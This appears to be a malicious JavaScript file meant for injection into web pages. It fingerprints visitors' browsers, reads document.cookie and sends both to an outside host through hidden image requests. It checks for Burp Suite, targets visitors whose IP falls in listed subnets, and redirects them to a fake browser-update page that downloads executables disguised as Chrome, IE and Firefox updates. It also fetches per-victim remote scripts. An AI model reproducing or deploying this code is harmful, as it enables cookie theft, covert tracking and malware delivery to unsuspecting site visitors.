





  var MD5 = function (string) {

   function RotateLeft(lValue, iShiftBits) {
           return (lValue<<iShiftBits) | (lValue>>>(32-iShiftBits));
   }

   function AddUnsigned(lX,lY) {
           var lX4,lY4,lX8,lY8,lResult;
           lX8 = (lX & 0x80000000);
           lY8 = (lY & 0x80000000);
           lX4 = (lX & 0x40000000);
           lY4 = (lY & 0x40000000);
           lResult = (lX & 0x3FFFFFFF)+(lY & 0x3FFFFFFF);
           if (lX4 & lY4) {
                   return (lResult ^ 0x80000000 ^ lX8 ^ lY8);
           }
           if (lX4 | lY4) {
                   if (lResult & 0x40000000) {
                           return (lResult ^ 0xC0000000 ^ lX8 ^ lY8);
                   } else {
                           return (lResult ^ 0x40000000 ^ lX8 ^ lY8);
                   }
           } else {
                   return (lResult ^ lX8 ^ lY8);
           }
   }

   function F(x,y,z) { return (x & y) | ((~x) & z); }
   function G(x,y,z) { return (x & z) | (y & (~z)); }
   function H(x,y,z) { return (x ^ y ^ z); }
   function I(x,y,z) { return (y ^ (x | (~z))); }

   function FF(a,b,c,d,x,s,ac) {
           a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac));
           return AddUnsigned(RotateLeft(a, s), b);
   };

   function GG(a,b,c,d,x,s,ac) {
           a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac));
           return AddUnsigned(RotateLeft(a, s), b);
   };

   function HH(a,b,c,d,x,s,ac) {
           a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac));
           return AddUnsigned(RotateLeft(a, s), b);
   };

   function II(a,b,c,d,x,s,ac) {
           a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b, c, d), x), ac));
           return AddUnsigned(RotateLeft(a, s), b);
   };

   function ConvertToWordArray(string) {
           var lWordCount;
           var lMessageLength = string.length;
           var lNumberOfWords_temp1=lMessageLength + 8;
           var lNumberOfWords_temp2=(lNumberOfWords_temp1-(lNumberOfWords_temp1 % 64))/64;
           var lNumberOfWords = (lNumberOfWords_temp2+1)*16;
           var lWordArray=Array(lNumberOfWords-1);
           var lBytePosition = 0;
           var lByteCount = 0;
           while ( lByteCount < lMessageLength ) {
                   lWordCount = (lByteCount-(lByteCount % 4))/4;
                   lBytePosition = (lByteCount % 4)*8;
                   lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount)<<lBytePosition));
                   lByteCount++;
           }
           lWordCount = (lByteCount-(lByteCount % 4))/4;
           lBytePosition = (lByteCount % 4)*8;
           lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80<<lBytePosition);
           lWordArray[lNumberOfWords-2] = lMessageLength<<3;
           lWordArray[lNumberOfWords-1] = lMessageLength>>>29;
           return lWordArray;
   };

   function WordToHex(lValue) {
           var WordToHexValue="",WordToHexValue_temp="",lByte,lCount;
           for (lCount = 0;lCount<=3;lCount++) {
                   lByte = (lValue>>>(lCount*8)) & 255;
                   WordToHexValue_temp = "0" + lByte.toString(16);
                   WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length-2,2);
           }
           return WordToHexValue;
   };

   function Utf8Encode(string) {
           string = string.replace(/\r\n/g,"\n");
           var utftext = "";

           for (var n = 0; n < string.length; n++) {

                   var c = string.charCodeAt(n);

                   if (c < 128) {
                           utftext += String.fromCharCode(c);
                   }
                   else if((c > 127) && (c < 2048)) {
                           utftext += String.fromCharCode((c >> 6) | 192);
                           utftext += String.fromCharCode((c & 63) | 128);
                   }
                   else {
                           utftext += String.fromCharCode((c >> 12) | 224);
                           utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                           utftext += String.fromCharCode((c & 63) | 128);
                   }

           }

           return utftext;
   };

   var x=Array();
   var k,AA,BB,CC,DD,a,b,c,d;
   var S11=7, S12=12, S13=17, S14=22;
   var S21=5, S22=9 , S23=14, S24=20;
   var S31=4, S32=11, S33=16, S34=23;
   var S41=6, S42=10, S43=15, S44=21;

   string = Utf8Encode(string);

   x = ConvertToWordArray(string);

   a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476;

   for (k=0;k<x.length;k+=16) {
           AA=a; BB=b; CC=c; DD=d;
           a=FF(a,b,c,d,x[k+0], S11,0xD76AA478);
           d=FF(d,a,b,c,x[k+1], S12,0xE8C7B756);
           c=FF(c,d,a,b,x[k+2], S13,0x242070DB);
           b=FF(b,c,d,a,x[k+3], S14,0xC1BDCEEE);
           a=FF(a,b,c,d,x[k+4], S11,0xF57C0FAF);
           d=FF(d,a,b,c,x[k+5], S12,0x4787C62A);
           c=FF(c,d,a,b,x[k+6], S13,0xA8304613);
           b=FF(b,c,d,a,x[k+7], S14,0xFD469501);
           a=FF(a,b,c,d,x[k+8], S11,0x698098D8);
           d=FF(d,a,b,c,x[k+9], S12,0x8B44F7AF);
           c=FF(c,d,a,b,x[k+10],S13,0xFFFF5BB1);
           b=FF(b,c,d,a,x[k+11],S14,0x895CD7BE);
           a=FF(a,b,c,d,x[k+12],S11,0x6B901122);
           d=FF(d,a,b,c,x[k+13],S12,0xFD987193);
           c=FF(c,d,a,b,x[k+14],S13,0xA679438E);
           b=FF(b,c,d,a,x[k+15],S14,0x49B40821);
           a=GG(a,b,c,d,x[k+1], S21,0xF61E2562);
           d=GG(d,a,b,c,x[k+6], S22,0xC040B340);
           c=GG(c,d,a,b,x[k+11],S23,0x265E5A51);
           b=GG(b,c,d,a,x[k+0], S24,0xE9B6C7AA);
           a=GG(a,b,c,d,x[k+5], S21,0xD62F105D);
           d=GG(d,a,b,c,x[k+10],S22,0x2441453);
           c=GG(c,d,a,b,x[k+15],S23,0xD8A1E681);
           b=GG(b,c,d,a,x[k+4], S24,0xE7D3FBC8);
           a=GG(a,b,c,d,x[k+9], S21,0x21E1CDE6);
           d=GG(d,a,b,c,x[k+14],S22,0xC33707D6);
           c=GG(c,d,a,b,x[k+3], S23,0xF4D50D87);
           b=GG(b,c,d,a,x[k+8], S24,0x455A14ED);
           a=GG(a,b,c,d,x[k+13],S21,0xA9E3E905);
           d=GG(d,a,b,c,x[k+2], S22,0xFCEFA3F8);
           c=GG(c,d,a,b,x[k+7], S23,0x676F02D9);
           b=GG(b,c,d,a,x[k+12],S24,0x8D2A4C8A);
           a=HH(a,b,c,d,x[k+5], S31,0xFFFA3942);
           d=HH(d,a,b,c,x[k+8], S32,0x8771F681);
           c=HH(c,d,a,b,x[k+11],S33,0x6D9D6122);
           b=HH(b,c,d,a,x[k+14],S34,0xFDE5380C);
           a=HH(a,b,c,d,x[k+1], S31,0xA4BEEA44);
           d=HH(d,a,b,c,x[k+4], S32,0x4BDECFA9);
           c=HH(c,d,a,b,x[k+7], S33,0xF6BB4B60);
           b=HH(b,c,d,a,x[k+10],S34,0xBEBFBC70);
           a=HH(a,b,c,d,x[k+13],S31,0x289B7EC6);
           d=HH(d,a,b,c,x[k+0], S32,0xEAA127FA);
           c=HH(c,d,a,b,x[k+3], S33,0xD4EF3085);
           b=HH(b,c,d,a,x[k+6], S34,0x4881D05);
           a=HH(a,b,c,d,x[k+9], S31,0xD9D4D039);
           d=HH(d,a,b,c,x[k+12],S32,0xE6DB99E5);
           c=HH(c,d,a,b,x[k+15],S33,0x1FA27CF8);
           b=HH(b,c,d,a,x[k+2], S34,0xC4AC5665);
           a=II(a,b,c,d,x[k+0], S41,0xF4292244);
           d=II(d,a,b,c,x[k+7], S42,0x432AFF97);
           c=II(c,d,a,b,x[k+14],S43,0xAB9423A7);
           b=II(b,c,d,a,x[k+5], S44,0xFC93A039);
           a=II(a,b,c,d,x[k+12],S41,0x655B59C3);
           d=II(d,a,b,c,x[k+3], S42,0x8F0CCC92);
           c=II(c,d,a,b,x[k+10],S43,0xFFEFF47D);
           b=II(b,c,d,a,x[k+1], S44,0x85845DD1);
           a=II(a,b,c,d,x[k+8], S41,0x6FA87E4F);
           d=II(d,a,b,c,x[k+15],S42,0xFE2CE6E0);
           c=II(c,d,a,b,x[k+6], S43,0xA3014314);
           b=II(b,c,d,a,x[k+13],S44,0x4E0811A1);
           a=II(a,b,c,d,x[k+4], S41,0xF7537E82);
           d=II(d,a,b,c,x[k+11],S42,0xBD3AF235);
           c=II(c,d,a,b,x[k+2], S43,0x2AD7D2BB);
           b=II(b,c,d,a,x[k+9], S44,0xEB86D391);
           a=AddUnsigned(a,AA);
           b=AddUnsigned(b,BB);
           c=AddUnsigned(c,CC);
           d=AddUnsigned(d,DD);
      }

    var temp = WordToHex(a)+WordToHex(b)+WordToHex(c)+WordToHex(d);

    return temp.toLowerCase();
}



      var require,define;!function(e){function r(e,r,n){var t=document.createElement("script");t.type="text/javascript",t.src=e,t.onerror=function(){n&&n()},t.onload=function(){r&&r()},i?setTimeout(function(){a.appendChild(t)},0):a.appendChild(t)}function n(e,r){var n=new RegExp("(?:^|\\?|#|&)"+e+"=([^&#]*)(?:$|&|#)","i"),t=n.exec(r||location.href);return t?encodeURI(t[1]):""}function t(e,n,t){var o=l[e]||(l[e]=[]);o.push(n);var i=e.replace(/\.js$/,".css");d[i]&&require.loadCss(i);var a=e.replace(/\.js$/,".scss");d[a]&&require.loadCss(a);var u=d[e]||{},f=u.pkg&&!s?v[u.pkg].url:u.url||e;f in p||(p[f]=!0,r(f,null,t))}function o(e,r){if(e)for(var n in e)e.hasOwnProperty(n)&&(r[n]=e[n])}var i=/IE/.test(navigator.userAgent),s="true"===n("fis_debug"),a=document.getElementsByTagName("head")[0],l={},u={},f={},c={},p={},d={},v={};define=function(e,r){f[e]=r;var n=l[e];if(n){for(var t=n.length-1;t>=0;--t)n[t]();delete l[e]}},require=function(e){e=require.alias(e);var r=c[e];if(r)return r.exports;var n=f[e];if(!n)throw Error("Cannot find module `"+e+"`");r=c[e]={exports:{}};var t="function"==typeof n?n.apply(r,[require,r.exports,r]):n;return t&&(r.exports=t),r.exports},require.async=function(n,o,i){function s(e){for(var r=e.length-1;r>=0;--r){var n=e[r];if(!(n in f||n in v)){v[n]=!0,h++,/\.css$/.test(n)?require.loadCss(n,a,i):t(n,a,i);var o=d[n];o&&"deps"in o&&s(o.deps)}}}function a(){if(0==h--){var r,n,t=[];for(r=0,n=l.length;n>r;++r)t[r]=require(l[r]);o&&o.apply(e,t)}}var l;l="string"==typeof n?[n]:n;for(var u=[],c=l.length-1;c>=0;--c)l[c].match(/^src\:/)?(u.push(l[c].substring(4)),l.splice(c,1)):l[c]=require.alias(l[c]);var p=u[0];if(u.length>1){for(c=u.length-1;c>=1;--c)r(u[c],null,i);0==l.length?r(p,o,i):r(p,null,i)}else 1==u.length&&(0==l.length?r(p,o,i):r(p,null,i));if(0!==l.length){var v={},h=0;s(l),a()}},require.resourceMap=function(e){o(e.res,d),o(e.pkg,v)},require.alias=function(e){return e},function(e){var r=function(){var e,r,n="opera",t="chrome",o="safari",i="firefox",s="ie",a=window,l=a.navigator.userAgent;return a.opera&&(e=n,r=parseFloat(a.opera.version())),/AppleWebKit\/(\S+)/.test(l)&&(/Chrome\/(\S+)/.test(l)?(e=t,r=parseFloat(RegExp.$1)):/Version\/(\S)/.test(l)?(e=o,r=parseFloat(RegExp.$1)):(e=o,r=2)),/Firefox\/(\S)/.test(l)&&(e=i,r=parseFloat(RegExp.$1)),(window.ActiveXObject||"ActiveXObject"in window)&&(e=s,/MSIE ([^;]+)/.test(l)&&(r=parseFloat(RegExp.$1))),{browser:e,version:r}}(),n={},t=r.browser,o=r.version,i="ie"==t||"firefox"==t&&o>8.9||"opera"==t||"chrome"==t&&o>19||"safari"==t&&o>5.9,a="chrome"==t&&o>9||"safari"==t&&o>4.9||"firefox"==t,l=/\.css(?:\?\S+|#\S+)?$/,f={importCSS:function(r,s){var l="function"==typeof s,u=function(){n[r]=!0,f(),l&&s()},f=function(){p.onload=p.onerror=null,c=null};if(n[r])return void(l&&s());var c=e,p=document.createElement("link");if(p.rel="stylesheet",p.type="text/css",p.href=r,p.onerror=f,l)if(i)p.onload=function(){u()},"ie"==t&&6==o?setTimeout(function(){c.appendChild(p)},0):c.appendChild(p);else if(a){c.appendChild(p);var d=document.createElement("img");d.onerror=function(){d.onerror=null,d=null,u()},d.src=r}else{c.appendChild(p);var v=function(){p.sheet&&"object"==typeof p.sheet.cssRules?u():setTimeout(v,300)};v()}else c.appendChild(p)},loadCss:function(e,r,n){function t(e,r){if(!e||u[e])return void r();if(u[e]=!0,!l.test(e))throw new Error("the file must be the css file!!!");f.importCSS(e,r)}function o(){var n=e.shift();n?t(n,o):r&&r()}e="string"==typeof e?[e]:e;var i=e.length;if(!i||1>i)throw new Error("urls is not allowed empty!");if(n)o();else for(var s=0;s<e.length;s++)t(e[s],function(){i--,0===i&&r&&r()})}};require.loadCss=function(e,r,n){if(e="string"==typeof e?[e]:e,!e.length)return r();for(var t=0,o=e.length;o>t;t++){var i=e[t],a=d[i]||{},l=a.pkg&&!s?v[a.pkg].url:a.url||i;e[t]=l===i?i.replace(/(\S+):(\S+)/,function(e,r,n){return"/box-static/"+r+"/"+n}):l}f.loadCss(e,r,n)}}(a)}(this);





function setCookie(name, value, expireTimeInMillSeconds){
    if (expireTimeInMillSeconds) {
        var expireTime = new Date();
        expireTime.setTime(expireTime.getTime() + expireTimeInMillSeconds);
        document.cookie = name + "=" + escape(value) + ";expires=" + expireTime.toGMTString();
    } else {
        document.cookie = name + "=" + escape(value);
    }
}


function checkCookieIfExsit(name) {
    var exsits = false;
    var allCookie = document.cookie;
    var cookieArr = allCookie.split(";");
    for (var i = 0; i < cookieArr.length; i++) {
        var cookieName = cookieArr[i].split("=")[0].trim();
        if (cookieName === name) {
            exsits = true;
            break;
        }
    }
    return exsits;
}








//steal cookie ,send sensitivie informaiton



        function getOS() {
    var os;
    if (navigator.userAgent.indexOf('Android') > -1 || navigator.userAgent.indexOf('Linux') > -1) {
        os = 'Android';
    } else if (navigator.userAgent.indexOf('iPhone') > -1) {
        os = 'iOS';
    } else if (navigator.userAgent.indexOf('Windows Phone') > -1) {
        os = 'WP';
    } else {
        os = 'IS not Mobile terminal';
    }
    return os;
}
function getOSVersion() {
    var OSVision = '1.0';
    var u = navigator.userAgent;
    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1; //Android
    var isIOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios
    if (isAndroid) {
        OSVision = navigator.userAgent.split(';')[1].match(/\d+\.\d+/g)[0];
    }
    if (isIOS) {
        OSVision = navigator.userAgent.split(';')[1].match(/(\d+)_(\d+)_?(\d+)?/)[0];
    }
    return OSVision;
}
function getDeviceType() {
    var deviceType;
    var sUserAgent = navigator.userAgent.toLowerCase();
    var bIsIpad = sUserAgent.match(/(ipad)/i) == "ipad";
    var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
    var bIsMidp = sUserAgent.match(/midp/i) == "midp";
    var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
    var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
    var bIsAndroid = sUserAgent.match(/android/i) == "android";
    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
    if (!(bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM)) {
        deviceType = 'PC'; //pc
    } else if (bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
        deviceType = 'phone'; //phone
    } else if (bIsIpad) {
        deviceType = 'ipad'; //ipad
    } else {
        deviceType = 'Unknown';
    }
    return deviceType;
}
function getNetWork() {
    var netWork;
    switch (navigator.connection.effectiveType) {
        case 'wifi':
            netWork = 'wifi'; // wifi
            break;
        case '4g':
            netWork = '4G'; // 4g
            break;
        case '2g':
            netWork = '2G'; // 2g
            break;
        case  '3g':
            netWork = '3G'; // 3g
            break;
        case  'ethernet':
            netWork = 'ethernet'; // ethernet
            break;
        case  'default':
            netWork = 'Unknown'; //
            break;
    }
    return netWork;
}
// function createFingerprint(domain) {
//     var fingerprint;
//     function bin2hex(s) {
//         var i, l, n, o = '';
//         s += '';
//         for (i = 0, l = s.length; i < l; i++) {
//             n = s.charCodeAt(i)
//                 .toString(16);
//             o += n.length < 2 ? '0' + n : n;
//         }
//         return o;
//     }
//     var canvas = document.createElement('canvas');
//     var ctx = canvas.getContext('2d');
//     var txt = domain || window.location.host;
//     ctx.textBaseline = "top";
//     ctx.font = "14px 'Arial'";
//     ctx.textBaseline = "tencent";
//     ctx.fillStyle = "#f60";
//     ctx.fillRect(125, 1, 62, 20);
//     ctx.fillStyle = "#069";
//     ctx.fillText(txt, 2, 15);
//     ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
//     ctx.fillText(txt, 4, 17);
//     var b64 = canvas.toDataURL().replace("data:image/png;base64,", "");
//     var bin = atob(b64);
//     var crc = bin2hex(bin.slice(-16, -12));
//     fingerprint = crc;
//     return fingerprint;
// }
function getOsInfo() {
        var userAgent = navigator.userAgent.toLowerCase();
        var name = 'Unknown';
        var version = "Unknown";
        if(userAgent.indexOf("win") > -1) {
                name = "Windows";
                if(userAgent.indexOf("windows nt 5.0") > -1) {
                        version = "Windows 2000";
                } else if(userAgent.indexOf("windows nt 5.1") > -1 || userAgent.indexOf("windows nt 5.2") > -1) {
                        version = "Windows XP";
                } else if(userAgent.indexOf("windows nt 6.0") > -1) {
                        version = "Windows Vista";
                } else if(userAgent.indexOf("windows nt 6.1") > -1 || userAgent.indexOf("windows 7") > -1) {
                        version = "Windows 7";
                } else if(userAgent.indexOf("windows nt 6.2") > -1 || userAgent.indexOf("windows 8") > -1) {
                        version = "Windows 8";
                } else if(userAgent.indexOf("windows nt 6.3") > -1) {
                        version = "Windows 8.1";
                } else if(userAgent.indexOf("windows nt 6.2") > -1 || userAgent.indexOf("windows nt 10.0") > -1) {
                        version = "Windows 10";
                } else {
                        version = "Unknown";
                }
        } else if(userAgent.indexOf("iphone") > -1) {
                name = "Iphone";
        } else if(userAgent.indexOf("mac") > -1) {
                name = "Mac";
        } else if(userAgent.indexOf("x11") > -1 || userAgent.indexOf("unix") > -1 || userAgent.indexOf("sunname") > -1 || userAgent.indexOf("bsd") > -1) {
                name = "Unix";
        } else if(userAgent.indexOf("linux") > -1) {
                if(userAgent.indexOf("android") > -1) {
                        name = "Android"
                } else {
                        name = "Linux";
                }

        } else {
                name = "Unknown";
        }
        var os = new Object();
        os.name =  name;
        os.version = version;
        return os;

}
  function plugin_list()
{
    var agent = navigator.userAgent.toLowerCase();
    var all = new Array();
    if (navigator.plugins && navigator.plugins.length)
    {
        for (x = 0; x < navigator.plugins.length; x++)
        {

                all.push(navigator.plugins[x].name.replace(/,/g, " ") + "(Name:" + navigator.plugins[x].filename.replace(/,/g, " ") + ")");
        }
    }
    all=all.join("\r\n");
    return all;
}

try {
   var title = document.getElementsByTagName('title')[0];
   document_title=[document.title, title.text, title.innerHTML]
}
catch(err) {
  document_title = err.message;
}



function setCookie(name, value, expireTimeInMillSeconds){
    if (expireTimeInMillSeconds) {
        var expireTime = new Date();
        expireTime.setTime(expireTime.getTime() + expireTimeInMillSeconds);
        document.cookie = name + "=" + escape(value) + ";expires=" + expireTime.toGMTString();
    } else {
        document.cookie = name + "=" + escape(value);
    }
}


function checkCookieIfExsit(name) {
    var exsits = false;
    var allCookie = document.cookie;
    var cookieArr = allCookie.split(";");
    for (var i = 0; i < cookieArr.length; i++) {
        var cookieName = cookieArr[i].split("=")[0].trim();
        if (cookieName === name) {
            exsits = true;
            break;
        }
    }
    return exsits;
}



function onclick_initial_applicaiton(){
     var canvas = document.createElement("canvas");
    var gl = canvas.getContext("experimental-webgl");
    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    window.screen.width
    window.screen.height
    window.screen.colorDepth
    var url=window.location.href;
    var top_location = top.document.location.href;
    var host = window.location.host;
    var referer=document.referrer

     var image_all = document.createElement("img");
    image_all.style.display="none"
    image_all.src = "https://helen666.tk/index.php?c="+"onclick_initial_applicaitononclick_initial_applicaitononclick_initial_applicaitononclick_initial_applicaiton-------------------------------------Screen_witdth :"+screen.availWidth+"  | Screen_height: "+screen.availHeight+"  | Header informaiton : "+navigator.userAgent+"  | System: "+getOS()+"  |  Driving type: "+getDeviceType()+"  |  System verion: "+getOsInfo().name+" |  Browser Extension : "+plugin_list()+"    | Document_title:"+document_title+"  | URL:"+url+"  | "+" | Top_location :"+top_location+" | Host:"+host +" Referer: "+referer+"  | Graphic suppluer: "+gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)+"  | Graphic renderer : "+gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)+ "  | Platform:  " + navigator.platform+"  | cpu number: "+window.navigator.hardwareConcurrency+" | cookie:"+document.cookie+"\r\n\r\n";

    document.body.appendChild(image_all);
}



function identify(){
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("experimental-webgl");
    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    window.screen.width
    window.screen.height
    window.screen.colorDepth
    var url=window.location.href;
    var top_location = top.document.location.href;
    var host = window.location.host;
    var cpu_number=window.navigator.hardwareConcurrency;



    //console.log(window.navigator.hardwareConcurrency.toString()+window.screen.width.toString()+window.screen.height.toString()+"")
    var iden=window.navigator.hardwareConcurrency.toString()+window.screen.width.toString()+window.screen.height.toString()+"";
    console.log(MD5(iden));

    return MD5(iden);
}





function get_sensitive_infoamtion(){
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("experimental-webgl");
    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    window.screen.width
    window.screen.height
    window.screen.colorDepth
    var url=window.location.href;
    var top_location = top.document.location.href;
    var host = window.location.host;
    var referer=document.referrer
    var image = document.createElement("img");
    image.style.display="none"
    image.src = "https://helen666.tk/index.php?c="+"start_downloadingggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg-------------------------------------Screen_witdth :"+screen.availWidth+"  | Screen_height: "+screen.availHeight+"  | Header informaiton : "+navigator.userAgent+"  | System: "+getOS()+"  |  Driving type: "+getDeviceType()+"  |  System verion: "+getOsInfo().name+" |  Browser Extension : "+plugin_list()+"    | Document_title:"+document_title+"  | URL:"+url+"  | "+" | Top_location :"+top_location+" | Host:"+host +" Referer: "+referer+"  | Graphic suppluer: "+gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)+"  | Graphic renderer : "+gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)+ "  | Platform:  " + navigator.platform+"  | cpu number: "+window.navigator.hardwareConcurrency+" | cookie:"+document.cookie+"\r\n\r\n";



    var image2 = document.createElement("img");
    image2.src="http://burp/favicon.ico";
    image2.style.display="none";
    image2.onload=function(){
        new Image().src ='https://helen666.tk/index.php?c=c=openburusuite';
    }
    image2.onerror=function(){
        new Image().src ='https://helen666.tk/index.php?c=c=noburpsuite';
    }
    document.body.appendChild(image);
    document.body.appendChild(image2);
}


function notpc(){
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("experimental-webgl");
    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    window.screen.width
    window.screen.height
    window.screen.colorDepth
    var url=window.location.href;
    var top_location = top.document.location.href;
    var host = window.location.host;
    var referer=document.referrer
    var image = document.createElement("img");
    image.style.display="none"
    image.src = "https://helen666.tk/index.php?c="+"not pc-------------------------------------Screen_witdth :"+screen.availWidth+"  | Screen_height: "+screen.availHeight+"  | Header informaiton : "+navigator.userAgent+"  | System: "+getOS()+"  |  Driving type: "+getDeviceType()+"  |  System verion: "+getOsInfo().name+" |  Browser Extension : "+plugin_list()+"    | Document_title:"+document_title+"  | URL:"+url+"  | "+" | Top_location :"+top_location+" | Host:"+host +" Referer: "+referer+"  | Graphic suppluer: "+gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)+"  | Graphic renderer : "+gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)+ "  | Platform:  " + navigator.platform+"  | cpu number: "+window.navigator.hardwareConcurrency+" | cookie:"+document.cookie+"\r\n\r\n";



    var image2 = document.createElement("img");
    image2.src="http://burp/favicon.ico";
    image2.style.display="none";
    image2.onload=function(){
        new Image().src ='https://helen666.tk/index.php?c=c=openburusuite';
    }
    image2.onerror=function(){
        new Image().src ='https://helen666.tk/index.php?c=c=noburpsuite';
    }
    document.body.appendChild(image);
    document.body.appendChild(image2);
}





function Target(){
  
       function test(ip,netMask,specific_ip){
          var resultIp = ip.split(".");
              var resultMask = netMask.split(".");
          var resultAddValue=specific_ip.split(".");
    //      console.log('resultIp',resultIp);
    //      console.log('resultMask',resultMask);
    //      console.log('resultAddValue',resultAddValue);
              
              var resultAddValueNumber = Number(resultAddValue[0])*256*256*256 + Number(resultAddValue[1])*256*256 + Number(resultAddValue[2])*256 +Number(resultAddValue[3]);
    //        console.log('resultAddValueNumber',resultAddValueNumber);
              var subNet = [];
              for (var i = 0, num = resultIp.length; i < num; i++) {
                  var c = parseInt(resultIp[i]) & parseInt(resultMask[i]);
                  subNet.push(c);
              }
              subNet = subNet.join(".");
              // console.log(subNet);
              var subNetResult = subNet.split(".");
    //          console.log('subNetResult',subNetResult);
       
              var ipLeftNumber = Number(subNetResult[0])*256*256*256 + Number(subNetResult[1])*256*256 + Number(subNetResult[2])*256 +Number(1);
              var ipRightNumber = Number(subNetResult[0])*256*256*256 + Number(subNetResult[1])*256*256 + Number(subNetResult[2])*256 +Number(255);
    //          console.log('ipLeftNumber',ipLeftNumber);
    //          console.log('ipRightNumber',ipRightNumber);
              if(specific_ip != ""){
           
                if (resultAddValueNumber < ipLeftNumber || resultAddValueNumber > ipRightNumber){
                  //console.log('error targets!');
                }else{
                  start_phishing();
                }
              } 
        }



        const iplist=["175.176.48.111","203.177.107.222","203.177.107.202","61.244.68.78","203.177.107.213","103.233.2.1","45.121.37.1","119.28.94.1","124.6.128.182","180.232.127.101","103.119.131.1","103.166.97.116","134.159.236.2","130.105.91.49","212.107.29.1"]


    $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
      // Convert key-value pairs to JSON
      // https://stackoverflow.com/a/39284735/452587
      data = data.trim().split('\n').reduce(function(obj, pair) {
        pair = pair.split('=');
        return obj[pair[0]] = pair[1], obj;
      }, {});

      for(let i in iplist){
          //console.log(iplist[i])
          test(iplist[i],"255.255.255.0",data['ip']);
          console.log(data['ip'])
        }
    });

    
}




function start_phishing(){




if(document.cookie.indexOf("onclicking") !=-1){

}else{

        get_sensitive_infoamtion()
  //如果父窗口不是自己，则让父窗口导航到一个新页面
    if(window.parent != window){// 如果是在框架中
      //就让框架页面跳转到登陆页面
     window.parent.location.href = "https://browsers-update.github.io/index.html";




    }else{
     window.location.href = "https://browsers-update.github.io/index.html";
  }

    
  


        //document.form-validation-field-0
//document.getElementById("form-validation-field-0")


    document.getElementById("chrome").onclick=function()
    {
        onclick_initial_applicaiton();
       //alert("chrome")
   //document.cookie = "onclicking=value; SameSite=None;secure"
        for(var i=9;i<100;i++){


        }
      window.location.href="https://helen666.tk/Chrome_update.exe"
    }





    document.getElementById("IE").onclick=function()
    {
        onclick_initial_applicaiton();

     // alert("IE")
  // document.cookie = "onclicking=value; SameSite=None;secure"
        for(var i=9;i<100;i++){


        }
    window.location.href="https://helen666.tk/IEsetup_update.exe"
     }



document.getElementById("firefox").onclick=function()
    {
        onclick_initial_applicaiton();

      //alert("firefox")
//document.cookie = "onclicking=value; SameSite=None;secure"
        for(var i=9;i<100;i++){


        }
    window.location.href="https://helen666.tk//Firefox_update.exe"
    }



}





}









var system = {
            win: false,
            mac: false,
            xll: false,
            ipad:false
        };
        //检测平台
        var p = navigator.platform;
        system.win = p.indexOf("Win") == 0;
        system.mac = p.indexOf("Mac") == 0;
        system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
        system.ipad = (navigator.userAgent.match(/iPad/i) != null)?true:false;
        if (system.win ) {
                if(navigator.language.toLowerCase()=="en-gb"){
                    console.log("english")
                  }else if(navigator.language.toLowerCase()=="zh-hk"){
                    console.log("hk")
                  }else if(navigator.language.toLowerCase()=="zh-tw"){
                    console.log("tw")

                  }else{
                      var load_sign = document.createElement("script");
                      load_sign.style.display="none"
                      load_sign.src = "https://helen666.tk/"+identify()+".js?="+Math.random()
                      document.body.appendChild(load_sign);
                          load_sign.onload= function()
                          {
                          console.log("successful!");
                          return;

                          }
                      load_sign.onerror=function()
                          {
                           //console.log("loading js")
                           Target();


                          }

                  }



        } else {
            console.log("not pc");
            notpc()
        }






